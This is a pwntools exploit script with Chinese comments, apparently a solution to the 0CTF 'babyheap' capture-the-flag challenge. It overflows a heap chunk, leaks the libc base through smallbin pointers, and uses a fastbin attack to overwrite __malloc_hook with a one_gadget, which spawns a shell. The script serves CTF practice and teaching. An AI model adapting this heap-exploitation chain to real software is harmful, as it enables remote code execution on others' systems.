#-*- coding:utf-8 -*-
from pwn import *

p = process('./0ctfbabyheap')
#p = remote('127.0.0.1', 4000)
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

#context.log_level = 'debug'

def Allocate(size):
        p.recvuntil('Command: ')
        p.sendline('1')
        p.recvuntil('Size: ')
        p.sendline(str(size))

def Fill(index, content):
        p.recvuntil('Command: ')
        p.sendline('2')
        p.recvuntil('Index: ')
        p.sendline(str(index))
        p.recvuntil('Size: ')
        p.sendline(str(len(content) + 1))
        p.recvuntil('Content: ')
        p.sendline(content)

def Free(index):
        p.recvuntil('Command: ')
        p.sendline('3')
        p.recvuntil('Index: ')
        p.sendline(str(index))

def Dump(index):
        p.recvuntil('Command: ')
        p.sendline('4')
        p.recvuntil('Index: ')
        p.sendline(str(index))
        p.recvuntil('Content: \n')
        data = p.recvline()
        return data

def leak_libc():
        Allocate(0x60)	#0
        Allocate(0x40)	#1

	#从chunk0溢出，将chunk1的size改为0x71，使chunk1覆盖范围更大
        payload = 'a'*0x60 + p64(0) + p64(0x71)
        Fill(0, payload)
	
	#分配一个0x100的smallchunk 再分配一个chunk是为了防止free smallchunk时被topchunk合并
	#该smallchunk的chunkhead(0x10个字节)和fd、bk(0x10个字节)都在修改后的chunk1的数据区
	#欲将chunk1释放掉再分配使chunk1范围真正扩大 
	#但释放时会检查下一个chunk的size是否大于2*size_sz且小于system_mem
	#所以还得构造一下next size
        Allocate(0x100)	#2
        Allocate(0x60)	#3
        payload = 'a'*0x10 + p64(0) + p64(0x71)
        Fill(2, payload)
	
	#释放chunk1并重新分配回来，因为alloc会初始化内存，所以smallchunk的前0x20个字节被清空
	#恢复smallchunk的前0x20个字节
        Free(1)	
        Allocate(0x60)	#1
        payload = 'a'*0x40 + p64(0) + p64(0x111)
        Fill(1, payload)
	
	#释放smallchunk 因为当smallbin是一个双向链表 所以当其中只有一个chunk时
	#该chunk的fd和bk都指向头结点 头结点存在于main_arena中 main_arena又存在于libc中
	#所以fd和bk指向的是libc中的某个地址 通过固定的偏移 则可以泄露出libc_base
        Free(2)
        leaked = u64(Dump(1)[-9:-1])
        print "libc_base : %#x" % (leaked - 0x3C27B8) #该偏移通过vmmap查看libc基址自行计算
        return leaked - 0x3C27B8

def fastbin_attack(libc_base):
	#malloc_hook 可以在gdb中 x/32gx (long long)(&main_arena)-0x40 来找到
        malloc_hook = libc_base + 0x3C2740	#该偏移决定于libc 可能需要更换
	#使用 one_gadget 找到execve('/bin/sh')	
        execve_addr = libc_base + 0x4647c	#该偏移决定于libc 可能需要更换

        print "malloc_hook : %#x" % malloc_hook
        print "execve_addr : %#x" % execve_addr
	
	#释放掉chunk1 通过溢出chunk0来修改chunk1的fd
	#通过控制chunk1的fd 则可以在任何地方分配内存 那么我们可以控制malloc_hook
	#因为malloc会检查fastbin中chunk的size是否属于这个fastbin
	#而malloc_hook处的值为0 不能通过检查
	#因为malloc_hook前面有60 8f 3a 04 7c 7f 00 00(0x7f7c043a8f60)这种数据 则可以将7f分离开
	#变成00 00 00 60 8f 3a 04 7c / 7f 00 00 00 00 00 00 00
	#这样就可以获得一个size位为0x7f的chunk
        Free(1)
        payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 19) + p64(0)
        Fill(0, payload)

	#通过两次分配 得到malloc_hook附近的chunk
        Allocate(0x60)
        Allocate(0x60)
	
	#覆盖一定的无效数据到达malloc_hook的地址 向其中写入execve_addr
        payload = p8(0)*3  + p64(execve_addr)
        Fill(2, payload)
	
	#malloc时判断malloc_hook不为0 执行malloc_hook指向的代码 getshell
        Allocate(0x60)

libc_base = leak_libc()
fastbin_attack(libc_base)

p.interactive()

